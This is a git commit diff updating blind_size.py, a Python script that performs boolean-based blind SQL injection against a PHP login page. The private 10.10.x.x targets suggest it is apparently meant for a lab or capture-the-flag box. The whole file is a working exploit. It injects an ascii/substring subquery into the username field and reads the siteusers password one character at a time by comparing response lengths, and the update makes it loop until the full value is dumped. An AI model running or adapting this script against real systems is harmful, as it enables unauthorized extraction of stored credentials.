662e749924fbf04a5c9d328c2a00e2022d8d0215
theDerfel <42454150+theDerfel@users.noreply.github.com>
2024-05-31 18:26:44 -0300

    Update blind_size.py

--- Blind/Request size/blind_size.py
+++ Blind/Request size/blind_size.py
@@ -1,20 +1,24 @@
-import requests, time
+import requests, time, sys
 
-url = 'http://10.10.182.148/index.php'
-url_logoff = 'http://10.10.182.148/logout.php'
-token = {'PHPSESSID':'sbmf3o32gebkpc0t1rg3o9gtg9'}
+url = 'http://10.10.33.83/index.php'
+url_logoff = 'http://10.10.33.83/logout.php'
+token = {'PHPSESSID':'klrlhcg22o89p00dg909ijaq2v'}
 caracteres = ' !"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
-tamanho = 20
-senha = ''
 tamanho_true = 618
+valor = ''
+cont = 0
 
-for i in range(1,tamanho + 1):
-    for c in caracteres:
-        dados = {"username":f"kitty' and ascii(substring((select password from siteusers limit 1),{i},1)) = '{ord(c)}'-- -","password":"fffff"}
-        r = requests.post(url, data=dados, cookies=token)
-        if len(r.text) == tamanho_true:
-            print(c)
-            senha += c
-            requests.get(url_logoff,cookies=token)
-            break
-print(senha)
+print("[*] Dumping table")
+while True:
+        cont += 1
+        for c in caracteres:
+                dados = {"username":f"kitty' and ascii(substring((select password from siteusers limit 1),{cont},1)) = '{ord(c)}'-- -","password":"fffff"}
+                r = requests.post(url, data=dados, cookies=token)
+                if len(r.text) == tamanho_true:
+                        print("[-] Found: ", c)
+                        valor += c
+                        requests.get(url_logoff,cookies=token)
+                        break
+                if c == caracteres[-1]:
+                        print("[*] Final: ", valor)
+                        sys.exit();
